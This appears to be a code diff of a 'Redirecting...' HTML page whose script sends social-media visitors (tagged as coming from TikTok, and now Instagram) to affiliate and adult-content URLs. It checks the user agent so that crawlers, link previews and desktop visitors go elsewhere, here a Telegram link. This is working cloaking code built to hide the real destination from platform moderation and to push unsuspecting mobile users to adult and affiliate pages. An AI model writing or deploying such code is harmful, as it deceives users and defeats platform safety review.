@@ -6,28 +6,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script>
     const offers = [
-      "https://smark.top/click?o=2&a=6549&sub_id1=tiktok",
+      "https://smark.top/click?o=2&a=6549&sub_id1=inst",
       
-      "https://grzvkg.badmilfs.mobi/?utm_source=da57dc555e50572d&ban=tiktok&j1=1&s1=212364&s2=2182631"
+      "https://grzvkg.badmilfs.mobi/?utm_source=da57dc555e50572d&ban=inst&j1=1&s1=212364&s2=2182630"
+      
     ];
 
-    function isRealUser() {
-      const ua = navigator.userAgent || "";
-      const botKeywords = /bot|crawler|spider|curl|fetch|preview/i;
-      return !botKeywords.test(ua);
+    function isMobileDevice() {
+      const ua = navigator.userAgent.toLowerCase();
+      return /android|iphone|ipad|ipod/.test(ua);
     }
 
-    if (isRealUser()) {
-      const index = Math.floor(Math.random() * offers.length);
-      window.location.href = offers[index];
-    } else {
-      document.body.innerHTML = "<h1>Access denied</h1>";
+    function isMobileBrowser() {
+      const ua = navigator.userAgent.toLowerCase();
+      return /mobile|safari|crios|chrome|samsungbrowser/.test(ua);
     }
+
+    function isRealMobileUser() {
+      return isMobileDevice() && isMobileBrowser();
+    }
+
+    function hashString(str) {
+      let hash = 0;
+      for (let i = 0; i < str.length; i++) {
+        hash = ((hash << 5) - hash) + str.charCodeAt(i);
+        hash |= 0; // Convert to 32bit integer
+      }
+      return Math.abs(hash);
+    }
+
+    // Генерируем хеш от юзер-агента и времени захода (±детерминированно)
+    const ua = navigator.userAgent;
+    const now = new Date().getTime();
+    const salt = Math.floor(now / (1000 * 60 * 60)); // 1 час как "сессия"
+    const hash = hashString(ua + salt);
+    const offerIndex = hash % offers.length;
+
+    const redirectTo = isRealMobileUser()
+      ? offers[offerIndex]
+      : "https://t.me/me9fun";
+
+    window.location.href = redirectTo;
   </script>
 </head>
 <body>
   <p>Redirecting...</p>
 </body>
-
 </html>
+
+ 
+
+
+
 
